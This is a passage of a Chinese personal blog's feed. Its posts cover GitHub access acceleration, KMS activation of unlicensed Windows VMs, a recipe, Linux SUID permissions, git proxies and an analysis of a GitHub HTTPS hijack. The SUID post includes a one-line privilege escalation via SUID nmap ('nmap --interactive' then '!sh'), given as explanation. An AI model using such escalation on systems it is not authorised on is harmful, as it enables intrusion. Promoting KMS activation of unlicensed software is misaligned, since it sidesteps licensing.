title="[多个出口位置]"><p>创建之后会提供一个域名，可以将自己的域名CNAME解析到提供的域名上方便记忆，UCLOUD可以准确识别到是访问哪一台服务器</p><p>在我们使用的客户端上只需要用提供的加速域名和原服务端口号就可以了</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol><li>自产品实例创建之日起，7日内单个实例累计出向流量小于2MB，加速功能将被停用，所以一开始先多用点吧</li><li>每个源IP只能加速一个端口</li><li>加速流量上限官方未注明，滥用的话会被封</li></ol><h2 id="妙用"><a href="#妙用" class="headerlink" title="妙用"></a>妙用</h2><p>众所周知，github在国内的访问速度很慢，有时候clone一个库不得不忍受十几k几十k每秒的速度</p><p>而git是可以用ssh协议的，所以我们只需要从 <a href="https://api.github.com/meta" target="_blank" rel="noopener">https://api.github.com/meta</a> 找到github使用的ip，通过GlobalSSH加速22端口，然后将自己的域名解析到加速的ip，最后使用自己的域名clone就行了</p><p>经过我的尝试效果还不错，可以跑到10Mbps</p><p>我用的域名为 <code>githubssh.xyz</code> ，大家可以拿去用，使用方法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原命令</span><br><span class="line">git <span class="built_in">clone</span> git@github.com:moby/moby.git</span><br><span class="line"></span><br><span class="line">替换后</span><br><span class="line">git <span class="built_in">clone</span> git@githubssh.xyz:moby/moby.git</span><br></pre></td></tr></table></figure><p>为了能够自动更新ip，我写了一个程序，每天会检查github新的ip，创建新的globalssh，然后自动解析到域名githubssh.xyz上，由cloudflare进行DNS层面的负载均衡</p><p>开源地址为： <a href="https://github.com/zu1k/globalssh4github" target="_blank" rel="noopener">https://github.com/zu1k/globalssh4github</a></p><p>同时为了方便，改了一个插件： <a href="https://chrome.google.com/webstore/detail/github%E5%8A%A0%E9%80%9F/kejahdakjmkfddgnifodfnpcklckjjpo" target="_blank" rel="noopener">https://chrome.google.com/webstore/detail/github%E5%8A%A0%E9%80%9F/kejahdakjmkfddgnifodfnpcklckjjpo</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;UCloud已经对加速IP进行限制，本文中的方法即时失效&quot;&gt;&lt;a href=&quot;#UCloud已经对加速IP进行限制，本文中的方法即时失效&quot; class=&quot;headerlink&quot; title=&quot;UCloud已经对加速IP进行限制，本文中的方
      
    
    </summary>
    
    
      <category term="coding" scheme="https://blog.lgf.im/categories/coding/"/>
    
    
      <category term="ssh" scheme="https://blog.lgf.im/tags/ssh/"/>
    
      <category term="coding" scheme="https://blog.lgf.im/tags/coding/"/>
    
      <category term="ucloud" scheme="https://blog.lgf.im/tags/ucloud/"/>
    
  </entry>
  
  <entry>
    <title>kms激活</title>
    <link href="https://blog.lgf.im/2020/kms.html"/>
    <id>https://blog.lgf.im/2020/kms.html</id>
    <published>2020-04-08T01:09:02.000Z</published>
    <updated>2020-06-18T05:55:25.995Z</updated>
    
    <content type="html"><![CDATA[<p>这是一个无聊的，老生常谈的话题</p><p>我个人笔记本是自带的正版windows，但是在虚拟机里面的win却没有正版，我一般会用kms进行激活</p><p>github搜索kms会找到很多版本的kms激活服务端，比较出名的是这一个，可以一键运行起来：<a href="https://github.com/Wind4/vlmcsd" target="_blank" rel="noopener">https://github.com/Wind4/vlmcsd</a></p><p>相关的脚本啊，命令啊，在百度一搜一大堆，就不重复写了</p><p>分享一点我想说的，我的做法把用自己的域名cname解析网上搜到的kms服务器地址，然后用自己的域名进行激活。</p><p>因为你永远不知道他们提供的服务什么时候会中止或者域名什么时候会到期，像我这样有多个不同的虚拟机，如果这种事情发生我就需要打开每一个虚拟机分别重新运行激活脚本进行重新激活，这就很麻烦。</p><p>而用自己的域名的话，我只需要找一个好用的kms服务器然后修改dns的解析就行了，省了很多事</p><p>我自己用的激活脚本： <a href="https://gist.github.com/zu1k/612dd4b0a0193620d43c08a698e05d85" target="_blank" rel="noopener">https://gist.github.com/zu1k/612dd4b0a0193620d43c08a698e05d85</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这是一个无聊的，老生常谈的话题&lt;/p&gt;
&lt;p&gt;我个人笔记本是自带的正版windows，但是在虚拟机里面的win却没有正版，我一般会用kms进行激活&lt;/p&gt;
&lt;p&gt;github搜索kms会找到很多版本的kms激活服务端，比较出名的是这一个，可以一键运行起来：&lt;a href=&quot;
      
    
    </summary>
    
    
      <category term="share" scheme="https://blog.lgf.im/categories/share/"/>
    
    
      <category term="kms" scheme="https://blog.lgf.im/tags/kms/"/>
    
  </entry>
  
  <entry>
    <title>烤红薯</title>
    <link href="https://blog.lgf.im/2020/bake-sweet-potato.html"/>
    <id>https://blog.lgf.im/2020/bake-sweet-potato.html</id>
    <published>2020-03-31T03:17:57.000Z</published>
    <updated>2020-06-18T05:55:25.971Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>这应该是我第一篇记录生活的博文吧，之前一直是写一些学习、技术相关的文章，总感觉博客不应该只记录这些东西，那就开始吧</p></blockquote><p>妈妈从网上买了几斤红薯，今天突然说想吃，那就用烤箱烤一下吧</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>烤盘铺上锡纸（哑光面接触食物），红薯洗净不去皮，均匀的摆放到烤盘上</p><p>烤箱230度预热10分钟后就可以将烤盘放入了</p><h2 id="第一波"><a href="#第一波" class="headerlink" title="第一波"></a>第一波</h2><p>230度先烤30分钟，呼叫小爱：“小爱同学，30分钟后叫我”</p><p>30分钟不到（大约20多分钟吧）就闻到红薯的香气飘出来了，香啊</p><p>30分钟后打开烤箱，用夹子夹着给每个红薯翻个个</p><p>烤了半个小时的红薯朝上的那面有点软，但是没有怎么变色，接触锡纸的一面有点变黑了，焦感出来了</p><p>翻完个后拍了三张照片，可以看到整体还是不错的，火候还不到，有的地方已经流出油来了</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/bake-sweet-potato/ex_1.jpg" loading="lazy" class="" title="[整体]"><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/bake-sweet-potato/ex_2.jpg" loading="lazy" class="" title="[放大]"><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/bake-sweet-potato/ex_3.jpg" loading="lazy" class="" title="[有的地方流出来了油]"><h2 id="第二波"><a href="#第二波" class="headerlink" title="第二波"></a>第二波</h2><p>鉴于红薯个比较大，翻个后时间增加到45分钟，接着烤</p><p>中途没忍住，打开拍了一张照片，流了很多油啊，接触到烤盘发出滋滋的响声，很是诱人</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/bake-sweet-potato/ex_4.jpg" loading="lazy" class="" title="[流了很多油]"><h2 id="出炉"><a href="#出炉" class="headerlink" title="出炉"></a>出炉</h2><p>时间到，啥也不说了，直接看图吧</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/bake-sweet-potato/ex_5.jpg" loading="lazy" class="" title="[出炉]"><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/bake-sweet-potato/ex_6.jpg" loading="lazy" class="" title="[出炉]"><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/bake-sweet-potato/ex_7.jpg" loading="lazy" class="" title="[出炉]"><p>超级好吃，超级甜，超级香</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>这次因为是第一次烤，烤的时间稍微有点长，流出来太多油浪费了，还有一些油都烤糊了，下次会缩短一点时间</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/bake-sweet-potato/ex_8.jpg" loading="lazy" class="" title="[糊了]">]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;这应该是我第一篇记录生活的博文吧，之前一直是写一些学习、技术相关的文章，总感觉博客不应该只记录这些东西，那就开始吧&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;妈妈从网上买了几斤红薯，今天突然说想吃，那就用烤箱烤一下吧&lt;/p&gt;
&lt;h2 id=&quot;准备&quot;
      
    
    </summary>
    
    
      <category term="life" scheme="https://blog.lgf.im/categories/life/"/>
    
    
      <category term="cooking" scheme="https://blog.lgf.im/tags/cooking/"/>
    
      <category term="bake" scheme="https://blog.lgf.im/tags/bake/"/>
    
  </entry>
  
  <entry>
    <title>学习Linux中的SUID机制</title>
    <link href="https://blog.lgf.im/2020/linux-suid.html"/>
    <id>https://blog.lgf.im/2020/linux-suid.html</id>
    <published>2020-03-30T03:36:25.000Z</published>
    <updated>2020-06-18T05:55:25.995Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是SUID"><a href="#什么是SUID" class="headerlink" title="什么是SUID"></a>什么是SUID</h2><p>SUID简称位，英文全称是Set owner User ID up on execution，它是一种特殊的文件权限，能够让用户(如Bob)用其他用户(如root用户)的权限运行一个程序，而不需要用sudo进行临时提权</p><p>同一类的还有SGID，就不详细说了，原理与SUID一样，就以SUID为例</p><p>在一个程序执行的时候会有三个ID状态，在深入学习SUID之前必须能够区分下面三种ID：</p><ul><li>Real User ID</li><li>Effective User ID</li><li>Saved User ID</li></ul><p><code>Real User ID</code> 是执行这个程序的用户的真实ID，是已用户login时候的ID为准</p><p><code>Effective User ID</code> 是程序执行过程中使用权限时真正起作用的用户ID，操作系统在检查一个程序有没有某个权限的时候会看这个ID</p><p><code>Saved User ID</code> 是程序临时提权时需要保存的先前的用户ID，等提权结束后需要回退到这个用户ID</p><h2 id="SUID的作用"><a href="#SUID的作用" class="headerlink" title="SUID的作用"></a>SUID的作用</h2><p>如果用户user2有另一个用户user1的程序的执行权限，并且user1给这个程序设置了SUID位，那么user2就可以用user1的权限来执行这个程序</p><p>简单来说，SUID能够让用户(如Bob)用其他用户(如root用户)的权限运行一个程序，而不需要用sudo进行临时提权</p><p>举个例子：</p><p>所有用户的密码保存在 <code>/etc/shadow</code> 文件中，但是这个文件只有root用户能够进行写操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ls -l /etc/shadow</span></span><br><span class="line">-rw-r----- 1 root shadow 1639 Jan 27 12:50 /etc/shadow</span><br></pre></td></tr></table></figure><p>那如果普通用户想要修改自己的密码，是否需要让root用户帮着修改呢？</p><p>显然不需要，修改密码用到了 <code>/usr/bin/passwd</code> 这个程序，我们来看一下它的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ls -l /usr/bin/passwd</span></span><br><span class="line">-rwsr-xr-x 1 root root 63944 Dec 20 10:39 /usr/bin/passwd</span><br></pre></td></tr></table></figure><p>可以看到，这个程序的所有者是root用户，但是所有用户都有执行权限，并且设置了s位（怎么看出来的后面会说）</p><p>这样SUID机制就会在程序执行的时候发生作用，让普通用户可以用root权限修改<code>/etc/shadow</code>文件</p><p>SUID机制的存在使程序权限的控制更加方便，用户可以执行某个程序而不需要登录到程序拥有者的账号</p><h2 id="如何使用SUID"><a href="#如何使用SUID" class="headerlink" title="如何使用SUID"></a>如何使用SUID</h2><h3 id="查看SUID"><a href="#查看SUID" class="headerlink" title="查看SUID"></a>查看SUID</h3><p>通过命令 <code>ls -l</code> 即可看到文件的详细信息，包括权限表 <code>-rwxrwxrwx</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-   rwx   rwx   rwx</span><br><span class="line"></span><br><span class="line">第一位是文件类型，-就是普通文件，d代表目录，l代表链接文件，还有一些其他类型的文件不详细说了</span><br><span class="line"></span><br><span class="line">后面的9位可以分成三组，分别表示所有者权限、同组内用户权限，组外其他用户权限</span><br><span class="line"></span><br><span class="line">每一组都有三位，r 代表有读取权限，w 代表有写入权限，x 代表有执行权限，如果是 _ 就代表没有相应的权限</span><br><span class="line"></span><br><span class="line">如果文件所有者权限的 x 换成 s 就代表设置了SUID</span><br><span class="line"></span><br><span class="line">同理如果组内用户权限的 x 换成了 s 就代表设置了SGID</span><br></pre></td></tr></table></figure><h3 id="设置SUID"><a href="#设置SUID" class="headerlink" title="设置SUID"></a>设置SUID</h3><p>使用 <code>chmod 4000 filename</code> 可以设置SUID位</p><p>使用 <code>chmod 2000 filename</code> 可以设置SGID位</p><p>使用 <code>chmod 6000 filename</code> 可以同时设置SGID和SUID位</p><blockquote><p>注意: 2000\4000\6000都是不完整的权限，正常使用应该将000替换为相应的权限，例如 4755</p></blockquote><h3 id="取消SUID"><a href="#取消SUID" class="headerlink" title="取消SUID"></a>取消SUID</h3><p>使用 <code>chmod 755 filename</code> 可以取消SGID和SUID位</p><p>或者 <code>chmod u-s filename</code> or <code>chmod g-s filename</code> 也可以</p><h2 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h2><p>因为SUID位让程序在执行的时候有了所有者的权限，所以可以利用这点来提权</p><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入nmap的交互模式</span></span><br><span class="line">nmap --interactive</span><br><span class="line"><span class="comment"># 执行sh，提权成功</span></span><br><span class="line">!sh</span><br></pre></td></tr></table></figure><p>详细介绍见： <a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html</a></p><h2 id="SUID在脚本中失效"><a href="#SUID在脚本中失效" class="headerlink" title="SUID在脚本中失效"></a>SUID在脚本中失效</h2><p>假如user1用 <code>chmod 4777 /home/user1/script.sh</code> 命令给<code>script.sh</code>脚本设置SUID位，登录user2后执行这个脚本提示没有权限</p><p>这是因为SUID位只对编译过的可执行程序起作用，sh脚本的实际执行程序是sh或者bash之类，如果它们在执行的时候并不会检查脚本文件的SUID位，那就不会起作用了</p><p>Perl执行器会检查perl脚本的suid位，所以可以给pl脚本设置suid位</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;什么是SUID&quot;&gt;&lt;a href=&quot;#什么是SUID&quot; class=&quot;headerlink&quot; title=&quot;什么是SUID&quot;&gt;&lt;/a&gt;什么是SUID&lt;/h2&gt;&lt;p&gt;SUID简称位，英文全称是Set owner User ID up on execution，它是一
      
    
    </summary>
    
    
      <category term="coding" scheme="https://blog.lgf.im/categories/coding/"/>
    
    
      <category term="linux" scheme="https://blog.lgf.im/tags/linux/"/>
    
      <category term="coding" scheme="https://blog.lgf.im/tags/coding/"/>
    
      <category term="suid" scheme="https://blog.lgf.im/tags/suid/"/>
    
  </entry>
  
  <entry>
    <title>给git设置代理</title>
    <link href="https://blog.lgf.im/2020/set-proxy-for-git.html"/>
    <id>https://blog.lgf.im/2020/set-proxy-for-git.html</id>
    <published>2020-03-27T07:45:02.000Z</published>
    <updated>2020-06-18T05:55:25.999Z</updated>
    
    <content type="html"><![CDATA[<p>近期，Github的直连速度一直不理想，甚至被墙或者MITM，最好的解决办法就是挂代理</p><p>Git 可以使用四种不同的协议来传输资料：本地协议（Local），HTTP 协议，SSH（Secure Shell）协议及 Git 协议</p><p>而我们平时使用github一般使用两种协议，一种是http协议，另一种是ssh协议，针对这两种协议有两种不同的代理设置办法</p><h2 id="http协议"><a href="#http协议" class="headerlink" title="http协议"></a>http协议</h2><p>通常使用的链接形如：<code>https://github.com/git/git.git</code></p><p>针对这种协议，代理设置比较简单</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http或https代理</span></span><br><span class="line">git config --global https.proxy http://127.0.0.1:1080</span><br><span class="line">git config --global https.proxy https://127.0.0.1:1080</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取消代理</span></span><br><span class="line">git config --global --<span class="built_in">unset</span> http.proxy</span><br><span class="line">git config --global --<span class="built_in">unset</span> https.proxy</span><br></pre></td></tr></table></figure><h2 id="ssh协议"><a href="#ssh协议" class="headerlink" title="ssh协议"></a>ssh协议</h2><p>通常使用的链接形如：<code>git@github.com:git/git.git</code> 或者 <code>ssh://[&lt;username&gt;@]&lt;server&gt;[:&lt;port&gt;]/path/repo.git</code></p><p>对于使用ssh协议的库，上面的代理设置办法就失效了，需要给ssh设置socks代理</p><p>在 <code>~/.ssh/config</code> 文件中添加下面内容， 如果没有这个文件就新建</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">ProxyCommand nc -X 5 -x 127.0.0.1:1080 %h %p</span><br></pre></td></tr></table></figure><p>这里使用的是nc命令，linux需要安装netcat(一般自带了)，windows需要单独下载</p><p>windows如果安装了<code>mingw</code>也可以使用<code>connect</code>命令来替代<code>nc</code>命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">ProxyCommand connect -S 127.0.0.1:1080 %h %p</span><br></pre></td></tr></table></figure><blockquote><p>补充： 详见 <a href="https://blog.lgf.im/2020/use-ucloud-globalssh-to-speedup-server-ssh.html">https://blog.lgf.im/2020/use-ucloud-globalssh-to-speedup-server-ssh.html</a><br>可以通过 GlobalSSH 的海外加速服务来加速github的访问，经过我的尝试效果还不错，可以跑到10Mbps<br>我用的域名为 <code>zll.us</code> ，大家可以拿去用，使用方法如下：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原命令</span><br><span class="line">git <span class="built_in">clone</span> git@github.com:moby/moby.git</span><br><span class="line"></span><br><span class="line">替换后</span><br><span class="line">git <span class="built_in">clone</span> git@zll.us:moby/moby.git</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;近期，Github的直连速度一直不理想，甚至被墙或者MITM，最好的解决办法就是挂代理&lt;/p&gt;
&lt;p&gt;Git 可以使用四种不同的协议来传输资料：本地协议（Local），HTTP 协议，SSH（Secure Shell）协议及 Git 协议&lt;/p&gt;
&lt;p&gt;而我们平时使用git
      
    
    </summary>
    
    
      <category term="coding" scheme="https://blog.lgf.im/categories/coding/"/>
    
    
      <category term="github" scheme="https://blog.lgf.im/tags/github/"/>
    
      <category term="proxy" scheme="https://blog.lgf.im/tags/proxy/"/>
    
      <category term="git" scheme="https://blog.lgf.im/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>Github等大面积https劫持</title>
    <link href="https://blog.lgf.im/2020/mitm-https-hijack-github.html"/>
    <id>https://blog.lgf.im/2020/mitm-https-hijack-github.html</id>
    <published>2020-03-27T00:47:11.000Z</published>
    <updated>2020-06-18T05:55:25.995Z</updated>
    
    <content type="html"><![CDATA[<p>昨天下午两点多，突然在一个站长群里听到有人说 Github Pages 的证书大批量出现错误，不一会就在V2EX上看到相关讨论的帖子</p><p>当天晚上再次刷V2EX的时候发现部分cloudflare的IP和京东主站部分IP也出现相似的劫持事件</p><p>今天早晨8点左右，在V2EX上发现有人讨论 Github 主站出现相同的https劫持，不经过代理访问发现证书的确异常</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/mitm-https-hijack-github/github-cert-warn.jpg" loading="lazy" class="" title="[Github证书异常警告]"><p>查看证书详情</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/mitm-https-hijack-github/fake-cert-ca.jpg" loading="lazy" class="" title="[假CA证书]"><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/mitm-https-hijack-github/fake-cert-2.jpg" loading="lazy" class="" title="[假证书]"><h2 id="检查Github证书"><a href="#检查Github证书" class="headerlink" title="检查Github证书"></a>检查Github证书</h2><p>这里我通过北京和香港两台阿里云主机，使用openssl提供的方法查看证书详细内容</p><p>命令为: <code>openssl s_client -showcerts -connect github.com:443 &lt; /dev/null</code></p><h3 id="北京阿里云"><a href="#北京阿里云" class="headerlink" title="北京阿里云"></a>北京阿里云</h3><details>  <summary>点击展开</summary><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ openssl s_client -showcerts -connect github.com:443 &lt; /dev/null</span><br><span class="line">CONNECTED(00000003)</span><br><span class="line">depth=1 C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = CA, emailAddress = 346608453@qq.com</span><br><span class="line">verify error:num=19:self signed certificate <span class="keyword">in</span> certificate chain</span><br><span class="line">verify <span class="built_in">return</span>:1</span><br><span class="line">depth=1 C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = CA, emailAddress = 346608453@qq.com</span><br><span class="line">verify <span class="built_in">return</span>:1</span><br><span class="line">depth=0 C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = SERVER, emailAddress = 346608453@qq.com</span><br><span class="line">verify <span class="built_in">return</span>:1</span><br><span class="line">---</span><br><span class="line">Certificate chain</span><br><span class="line"> 0 s:C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = SERVER, emailAddress = 346608453@qq.com</span><br><span class="line">   i:C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = CA, emailAddress = 346608453@qq.com</span><br><span class="line">-----BEGIN CERTIFICATE-----</span><br><span class="line">MIIB4TCCAYcCFDjGwZUOfrr1+SWHR5GxJ/rwXsHZMAoGCCqGSM49BAMCMHExCzAJ</span><br><span class="line">BgNVBAYTAkNOMQswCQYDVQQIDAJHRDELMAkGA1UEBwwCU1oxDDAKBgNVBAoMA0NP</span><br><span class="line">TTEMMAoGA1UECwwDTlNQMQswCQYDVQQDDAJDQTEfMB0GCSqGSIb3DQEJARYQMzQ2</span><br><span class="line">NjA4NDUzQHFxLmNvbTAeFw0xOTA5MjYwOTMzMTNaFw0yOTA5MjMwOTMzMTNaMHUx</span><br><span class="line">CzAJBgNVBAYTAkNOMQswCQYDVQQIDAJHRDELMAkGA1UEBwwCU1oxDDAKBgNVBAoM</span><br><span class="line">A0NPTTEMMAoGA1UECwwDTlNQMQ8wDQYDVQQDDAZTRVJWRVIxHzAdBgkqhkiG9w0B</span><br><span class="line">CQEWEDM0NjYwODQ1M0BxcS5jb20wWTATBgcqhkjOPQIBBggqhkjOPQMBBwNCAASJ</span><br><span class="line">27aMaVclvmdT8m6l98K999FM4dYTg4ag0627S2bxbLYHyLdQ0jqay5kA9KCF9Ucw</span><br><span class="line">uzcqtTrNERlLIsxDGkLjMAoGCCqGSM49BAMCA0gAMEUCIH1+jEiQTVA+siP2g9kw</span><br><span class="line">ITFZZINVKyET48788OSCLK1hAiEA+c5bJvnrdtZ1rbsLXJWtglkXSeBaHy5Wdt7w</span><br><span class="line">dGc7McM=</span><br><span class="line">-----END CERTIFICATE-----</span><br><span class="line"> 1 s:C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = CA, emailAddress = 346608453@qq.com</span><br><span class="line">   i:C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = CA, emailAddress = 346608453@qq.com</span><br><span class="line">-----BEGIN CERTIFICATE-----</span><br><span class="line">MIICNzCCAd2gAwIBAgIUD6UJah0ReDrJIuxhqrTa0CAAbAMwCgYIKoZIzj0EAwIw</span><br><span class="line">cTELMAkGA1UEBhMCQ04xCzAJBgNVBAgMAkdEMQswCQYDVQQHDAJTWjEMMAoGA1UE</span><br><span class="line">CgwDQ09NMQwwCgYDVQQLDANOU1AxCzAJBgNVBAMMAkNBMR8wHQYJKoZIhvcNAQkB</span><br><span class="line">FhAzNDY2MDg0NTNAcXEuY29tMB4XDTE5MDkyNjA5MzIzN1oXDTI5MDkyMzA5MzIz</span><br><span class="line">N1owcTELMAkGA1UEBhMCQ04xCzAJBgNVBAgMAkdEMQswCQYDVQQHDAJTWjEMMAoG</span><br><span class="line">A1UECgwDQ09NMQwwCgYDVQQLDANOU1AxCzAJBgNVBAMMAkNBMR8wHQYJKoZIhvcN</span><br><span class="line">AQkBFhAzNDY2MDg0NTNAcXEuY29tMFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE</span><br><span class="line">qZ26n2ml6hcyf+NS0TP8PSZ1qlFzUb/tpr6Wb6zE9cSzkGOXej0ddI3sNvq/bLzk</span><br><span class="line">LLvaQLEzaIFyRDY6fcSQ36NTMFEwHQYDVR0OBBYEFKv8Ri5sjN4WZoaWvK/h9Yf+</span><br><span class="line">zhVyMB8GA1UdIwQYMBaAFKv8Ri5sjN4WZoaWvK/h9Yf+zhVyMA8GA1UdEwEB/wQF</span><br><span class="line">MAMBAf8wCgYIKoZIzj0EAwIDSAAwRQIhANFUxlZxx3dfmxEu1I0huK9eY/IPl6Xz</span><br><span class="line">AsUXUQZN2QPXAiACddgQK7I4I86sjPwjCMafPES9LkV/whcFV60LlAftaQ==</span><br><span class="line">-----END CERTIFICATE-----</span><br><span class="line">---</span><br><span class="line">Server certificate</span><br><span class="line">subject=C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = SERVER, emailAddress = 346608453@qq.com</span><br><span class="line"></span><br><span class="line">issuer=C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = CA, emailAddress = 346608453@qq.com</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">No client certificate CA names sent</span><br><span class="line">Peer signing digest: SHA256</span><br><span class="line">Peer signature <span class="built_in">type</span>: ECDSA</span><br><span class="line">Server Temp Key: X25519, 253 bits</span><br><span class="line">---</span><br><span class="line">SSL handshake has <span class="built_in">read</span> 1499 bytes and written 395 bytes</span><br><span class="line">Verification error: self signed certificate <span class="keyword">in</span> certificate chain</span><br><span class="line">---</span><br><span class="line">New, TLSv1.2, Cipher is ECDHE-ECDSA-AES128-GCM-SHA256</span><br><span class="line">Server public key is 256 bit</span><br><span class="line">Secure Renegotiation IS supported</span><br><span class="line">Compression: NONE</span><br><span class="line">Expansion: NONE</span><br><span class="line">No ALPN negotiated</span><br><span class="line">SSL-Session:</span><br><span class="line">    Protocol  : TLSv1.2</span><br><span class="line">    Cipher    : ECDHE-ECDSA-AES128-GCM-SHA256</span><br><span class="line">    Session-ID: 1A4A06D58F5DCC0FA80FFE4125AC12E555126BF8B7C7C627210B9C36F3B5A6ED</span><br><span class="line">    Session-ID-ctx:</span><br><span class="line">    Master-Key: 6BD176466BF93E52D592216063276369497FA26AFF0E7343A872FFA6E3F12BFF611BFDA4F5994F297ECC5772EE812305</span><br><span class="line">    PSK identity: None</span><br><span class="line">    PSK identity hint: None</span><br><span class="line">    SRP username: None</span><br><span class="line">    TLS session ticket lifetime hint: 7200 (seconds)</span><br><span class="line">    TLS session ticket:</span><br><span class="line">    0000 - 7a 4c 52 3b d5 f6 1c c4-ea 0d 86 45 37 1a 57 c4   zLR;.......E7.W.</span><br><span class="line">    0010 - a5 47 0e 76 87 9f f1 68-ac 6c 37 e3 02 87 61 77   .G.v...h.l7...aw</span><br><span class="line">    0020 - d9 c5 6a 65 88 3c 44 e5-17 59 5e 